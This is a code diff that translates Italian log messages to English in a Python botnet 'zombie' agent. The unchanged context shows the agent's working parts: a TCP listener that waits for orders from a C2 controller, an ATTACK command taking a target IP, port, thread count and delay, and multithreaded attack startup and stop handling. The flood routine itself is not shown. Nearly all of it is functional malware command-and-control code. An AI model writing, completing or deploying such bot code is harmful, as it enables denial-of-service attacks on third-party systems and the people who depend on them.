@@ -51,19 +51,19 @@ def start_attack(target_ip, target_port, workers=5, delay=0.01):
         attack_threads.append(t)
         t.start()
 
-    log(f"[Zombie] Attacco avviato verso {target_ip}:{target_port} con {workers} thread")
+    log(f"[Zombie] Attack started against {target_ip}:{target_port} with {workers} threads")
 
 
 def stop_attack():
     stop_attack_event.set()
-    log("[Zombie] Stop attacco richiesto")
+    log("[Zombie] Attack stop requested")
 
 
 def handle_command(command):
     parts = command.strip().split()
 
     if not parts:
-        return "ERR comando vuoto\n"
+        return "ERR empty command\n"
 
     if parts[0].upper() == "PING":
         return "PONG\n"
@@ -74,7 +74,7 @@ def handle_command(command):
 
     if parts[0].upper() == "ATTACK":
         if len(parts) < 3:
-            return "ERR uso: ATTACK <target_ip> <target_port> [workers] [delay]\n"
+            return "ERR usage: ATTACK <target_ip> <target_port> [workers] [delay]\n"
 
         target_ip = parts[1]
         target_port = int(parts[2])
@@ -84,7 +84,7 @@ def handle_command(command):
         start_attack(target_ip, target_port, workers, delay)
         return "OK attack started\n"
 
-    return "ERR comando non riconosciuto\n"
+    return "ERR unrecognized command\n"
 
 
 def client_handler(conn, addr):
@@ -95,13 +95,13 @@ def client_handler(conn, addr):
             return
 
         command = data.decode(errors="ignore").strip()
-        log(f"[Zombie] Comando ricevuto da {addr}: {command}")
+        log(f"[Zombie] Command received from {addr}: {command}")
 
         response = handle_command(command)
         conn.sendall(response.encode())
 
     except Exception as e:
-        log(f"[Zombie] Errore gestione client {addr}: {e}")
+        log(f"[Zombie] Error handling client {addr}: {e}")
 
     finally:
         try:
@@ -111,7 +111,7 @@ def client_handler(conn, addr):
 
 
 def run_server():
-    log(f"[Zombie] Avvio listener su {ZOMBIE_LISTEN_HOST}:{ZOMBIE_LISTEN_PORT}")
+    log(f"[Zombie] Starting listener on {ZOMBIE_LISTEN_HOST}:{ZOMBIE_LISTEN_PORT}")
 
     server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 
@@ -121,10 +121,10 @@ def run_server():
         server_socket.bind((ZOMBIE_LISTEN_HOST, ZOMBIE_LISTEN_PORT))
         server_socket.listen(50)
     except Exception as e:
-        log(f"[Zombie] ERRORE bind/listen porta {ZOMBIE_LISTEN_PORT}: {e}")
+        log(f"[Zombie] ERROR binding/listening on port {ZOMBIE_LISTEN_PORT}: {e}")
         sys.exit(1)
 
-    log("[Zombie] Listener attivo. In attesa di comandi dal master C2...")
+    log("[Zombie] Listener active. Waiting for commands from the C2 controller...")
 
     while True:
         try:
@@ -138,16 +138,16 @@ def run_server():
             t.start()
 
         except KeyboardInterrupt:
-            log("[Zombie] Interruzione manuale")
+            log("[Zombie] Manual interruption")
             break
 
         except Exception as e:
-            log(f"[Zombie] Errore accept: {e}")
+            log(f"[Zombie] Accept error: {e}")
             time.sleep(1)
 
 
 def shutdown_handler(signum, frame):
-    log("[Zombie] Arresto richiesto")
+    log("[Zombie] Shutdown requested")
     stop_attack()
     sys.exit(0)
 
